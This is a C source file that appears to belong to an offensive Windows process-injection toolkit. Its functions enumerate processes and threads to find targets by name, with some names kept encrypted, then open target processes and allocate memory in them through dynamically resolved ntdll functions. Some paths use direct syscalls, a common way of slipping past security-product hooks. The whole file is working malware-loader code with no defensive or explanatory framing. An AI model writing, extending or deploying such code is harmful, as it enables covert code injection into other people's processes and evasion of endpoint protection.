#include "lil_nemo_candy_injector.h"


DWORD lil_nemo_candy_raw_find_proc_pid(char *process_name, pLIL_NEMO_BAG bag) {
    if (bag->raw_k32[0] == 0) {
        return 0;
    }
    void *k32addr = bag->find_dll(bag->raw_k32, bag);
    if (!k32addr) {
        return 0;
    }
    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
    if (my_proc == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32addr, bag);
    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32addr, bag);
    if (proc_first(my_proc, &entry)) {
        do {
            if (strcmp(process_name, entry.szExeFile) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (proc_next(my_proc, &entry));
    }
    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
    close_handle(my_proc);
    return pid;
}

DWORD lil_nemo_candy_find_proc_pid(uint16_t *process_name, pLIL_NEMO_BAG bag) {
    if (bag->raw_k32[0] == 0) {
        return 0;
    }
    void *k32addr = bag->find_dll(bag->raw_k32, bag);
    if (!k32addr) {
        return 0;
    }
    pNEMO_BALLOC_MEM bmem = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
    pNEMO_BALLOC_MEM bmem2 = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
    uint16_t *extract_name = NemoExtractName(process_name, bag->ekey, bmem);

    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
    if (my_proc == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32addr, bag);
    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32addr, bag);
    if (proc_first(my_proc, &entry)) {
        do {
            BALLOC_empty_memory(bmem2);
            uint16_t *en_process_name = NemoConvertStr(entry.szExeFile, bag->ekey, bmem2);
            if (NemoCompareBag(extract_name, en_process_name) == 1) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (proc_next(my_proc, &entry));
    }
    free(bmem->ptr);
    free(bmem);
    free(bmem2->ptr);
    free(bmem2);
    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
    close_handle(my_proc);
    return pid;
}

DWORD lil_nemo_candy_find_proc2(NNType_NemoFoodFuncList food_process_list, pLIL_NEMO_BAG bag) {
    void *k32 = NULL;
    if (bag->FLAG_use_addr) {
        k32 = bag->addr_k32;
    }
    else {
        if (bag->raw_k32[0] == 0) {
            return 0;
        }
        k32 = bag->find_dll(bag->raw_k32, bag);
    }
    if (!k32) {
        return 0;
    }
    uint16_t **proc_names = malloc(LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE * sizeof(uint16_t*));
    memset(proc_names, 0, LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE * sizeof(uint16_t*));
    pLIL_NEMO_FOOD_LIST p_names = food_process_list(proc_names, LITTLE_NEMO_CANDY_INJECTOR_PROCESS_LIST_NAME_SIZE);
    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32, bag);
    HANDLE my_proc = snap(TH32CS_SNAPPROCESS, 0);
    if (my_proc == INVALID_HANDLE_VALUE) {
        return 0;
    }
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;
    NTypeProcess32First proc_first = bag->get_func2(lil_nemo_food_Process32First, k32, bag);
    NTypeProcess32Next proc_next = bag->get_func2(lil_nemo_food_Process32Next, k32, bag);
    pNEMO_BALLOC_MEM bmem = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
    pNEMO_BALLOC_MEM bmem2 = lil_nemo_balloc_init_memory(0, 8 * 1024, 512);
    int tar_proc_id = 0;
    uint16_t *tar_proc_name;
    if (proc_first(my_proc, &entry)) {
        do {
            BALLOC_empty_memory(bmem2);
            uint16_t *en_process_name = NemoConvertStr(entry.szExeFile, bag->ekey, bmem2);
            tar_proc_id = 0;
            while (p_names->list_ptr[tar_proc_id] != 0) {
                BALLOC_empty_memory(bmem);
                tar_proc_name = NemoExtractName(p_names->list_ptr[tar_proc_id], bag->ekey, bmem);
                if (NemoCompareBag(en_process_name, tar_proc_name) == 1) {
                    pid = entry.th32ProcessID;
                    break;
                }
                tar_proc_id++;
            if (pid != 0) {
                break;
            }
            }
        } while (proc_next(my_proc, &entry));
    }
    free(proc_names);
    p_names->clear(p_names);
    free(bmem->ptr);
    free(bmem);
    free(bmem2->ptr);
    free(bmem2);
    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32, bag);
    close_handle(my_proc);
    return pid;
}

DWORD lil_nemo_candy_find_thread_tid(DWORD proc_pid, pLIL_NEMO_BAG bag) {
    if (bag->raw_k32[0] == 0) {
        return 0;
    }
    void *k32addr = bag->find_dll(bag->raw_k32, bag);
    if (!k32addr) {
        return 0;
    }
    NTypeCreateToolhelp32Snapshot snap = bag->get_func2(lil_nemo_food_CreateToolhelp32Snapshot, k32addr, bag);
    HANDLE my_th = snap(TH32CS_SNAPTHREAD, 0);
    if (my_th == INVALID_HANDLE_VALUE) {
        return 0;
    }
    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);
    DWORD tid = 0;
    NTypeThread32First th_first = bag->get_func2(lil_nemo_food_Thread32First, k32addr, bag);
    NTypeThread32Next th_next = bag->get_func2(lil_nemo_food_Thread32Next, k32addr, bag);
    if (th_first(my_th, &entry)) {
        do {
            if (entry.th32OwnerProcessID == proc_pid) {
                tid = entry.th32ThreadID;
                break;
            }
        } while (th_next(my_th, &entry));
    }
    NTypeCloseHandle close_handle = bag->get_func2(lil_nemo_food_CloseHandle, k32addr, bag);
    close_handle(my_th);
    return tid;
}

HANDLE lil_nemo_candy_open_process(DWORD proc_pid, ACCESS_MASK acc_mask, pLIL_NEMO_BAG bag) {
    void *ntdll = NULL;
    if (bag->FLAG_use_addr == 1) {
        ntdll = bag->addr_ntdll;
    }
    else {
        if (bag->raw_ntdll[0] == 0) {
            return 0;
        }
        ntdll = bag->find_dll(bag->raw_ntdll, bag);
    }

    if (!ntdll) {
        return 0;
    }
    NTypeNtOpenProcess op_proc = bag->get_func2(lil_nemo_food_NtOpenProcess, ntdll, bag);
    if (!op_proc) {
        return 0;
    }
    OBJECT_ATTRIBUTES oattr;
    InitializeObjectAttributes(&oattr, NULL, 0, NULL, NULL);
    HANDLE hproc;
    CLIENT_ID cliid;
    cliid.UniqueProcess = (PVOID)(uintptr_t)proc_pid;
    cliid.UniqueThread = 0;
    if (bag->FLAG_use_syscall > 0) {
        nemo_ssn_ntopenprocess = bag->get_syscall2(op_proc);
        bag->last_ntstatus = NemoCandy_NtOpenProcess(&hproc, acc_mask, &oattr, &cliid);
        return hproc;
    }
    else {
        bag->last_ntstatus = op_proc(&hproc, acc_mask, &oattr, &cliid);
        return hproc;
    }
}

PVOID lil_nemo_candy_allocate_memory(HANDLE proc, SIZE_T mem_size, ULONG allocation_type, ULONG mem_flags, pLIL_NEMO_BAG bag) {
    void *ntdll = NULL;
    if (bag->FLAG_use_addr == 1) {
        ntdll = bag->addr_ntdll;
    }
    else {
        if (bag->raw_ntdll[0] == 0) {
            return 0;
        }
        ntdll = bag->find_dll(bag->raw_ntdll, bag);
    }
    if (!ntdll) {
        return 0;
    }
    SIZE_T pay_size = mem_size;
    PVOID mem_addr = NULL;
    NTypeNtAllocateVirtualMemory alloc_mem = bag->get_func2(lil_nemo_food_NtAllocateVirtualMemory, ntdll, bag);
    if (!alloc_mem) {
        return 0;
    }
    if (bag->FLAG_use_syscall == 1) {
        nemo_ssn_NtAllocateVirtualMemory = bag->get_syscall2(alloc_mem);
        bag->last_ntstatus = NemoCandy_NtAllocateVirtualMemory(proc, &mem_addr, 0, &pay_size, allocation_type, mem_flags);
    }
    else {
        bag->last_ntstatus = alloc_mem(proc, &mem_addr, 0, &pay_size, allocation_type, mem_flags);
    }
    return mem_addr;
}

